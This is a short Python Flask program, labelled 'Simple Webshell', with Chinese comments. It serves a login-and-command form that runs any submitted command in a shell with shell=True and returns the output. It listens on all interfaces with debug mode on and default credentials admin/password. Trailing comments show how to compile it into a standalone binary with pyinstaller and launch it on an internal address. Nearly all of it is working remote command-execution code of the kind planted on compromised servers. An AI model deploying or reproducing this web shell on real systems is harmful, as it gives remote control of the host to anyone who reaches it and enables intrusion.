from flask import Flask, request, Response
import argparse
import subprocess

app = Flask(__name__)

# 全局变量，用于存储命令行参数
args = None

def authenticate(username, password):
    # 这里可以根据自己的需求来进行身份验证，例如检查用户名和密码是否匹配数据库中的记录
    return username == args.username and password == args.password

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        command = request.form.get("command")
        
        if authenticate(username, password):
            result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = result.communicate()
            return "<pre>{}</pre>".format(output.decode() + error.decode())
        else:
            return Response("Unauthorized", 401)
    else:
        return '''
        <form method="post">
            <label for="username">Username:</label><br>
            <input type="text" id="username" name="username"><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password"><br>
            <label for="command">Enter command:</label><br>
            <input type="text" id="command" name="command"><br>
            <input type="submit" value="Submit">
        </form>
        '''

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple Webshell")
    parser.add_argument("-host", "--host", type=str, default="0.0.0.0", help="Host ip to run the server on")
    parser.add_argument("-port", "--port", type=int, default=8080, help="Port to run the server on")
    parser.add_argument("-u", "--username", type=str, default="admin", help="Username for authentication")
    parser.add_argument("-pw", "--password", type=str, default="password", help="Password for authentication")
    args, _ = parser.parse_known_args()
    
    # 运行 Flask 应用
    app.run(debug=True, host=args.host, port=args.port)

# 2024.03.30
# docker run -v "$(pwd):/src/" obenn/pyinstaller-linux:python3.7-64bit-precise "pyinstaller --onefile webshell.py"
#  ./dist/webshell  --host 192.168.1.10 -port 8080
